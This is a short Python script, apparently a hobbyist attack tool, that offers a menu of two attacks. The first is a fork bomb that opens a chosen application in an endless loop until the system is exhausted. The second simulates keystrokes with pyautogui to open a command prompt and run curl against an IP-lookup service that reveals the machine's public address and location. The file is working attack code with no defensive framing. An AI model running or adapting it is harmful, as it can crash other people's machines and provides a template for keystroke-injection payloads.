import os
import pyautogui as auto
from time import sleep

def forkbomb(app): 
    
    while True:
        os.startfile(app)



def payload_attack():
    auto.keyDown("win")
    auto.keyDown("r")
    
    auto.keyUp("r")
    auto.keyUp("win")
    auto.write("cmd")
    auto.keyDown("enter")
    auto.keyUp("enter")
    sleep(6)
    auto.write("curl https://ipinfo.io/json")
    auto.keyDown("enter")
    auto.keyUp("enter")


HackingInput = int(input("press 1 for forkbomb or press 2 for payload attack\n"))

if HackingInput == 1:
    application = str(input("enter the file path for the app you want to open in the forkbomb\n"))
    forkbomb(application)
elif HackingInput == 2:

    payload_attack()
